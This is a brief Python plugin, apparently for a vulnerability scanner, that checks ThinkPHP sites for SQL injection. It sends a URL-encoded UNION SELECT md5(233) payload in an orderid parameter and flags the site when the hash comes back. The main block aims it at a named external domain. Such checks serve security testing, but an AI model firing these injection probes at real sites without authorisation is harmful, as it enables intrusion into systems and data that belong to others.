#!/usr/bin/env python
#-*- coding:utf-8 -*-
import re

def assign(service, arg):
    if service == "thinkphp":
        return True, arg

def audit(arg):
    poc = arg + 'index.php?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+'
    code, head, res, errcode, _ = curl.curl(poc)
    if code == 200 and 'e165421110ba03099a1c0393373c5b43' in res:
        security_hole(poc +" Can be inject!")

if __name__ == '__main__':
    from dummy import *
    audit(assign('thinkphp', 'http://www.binkanter.com/')[1])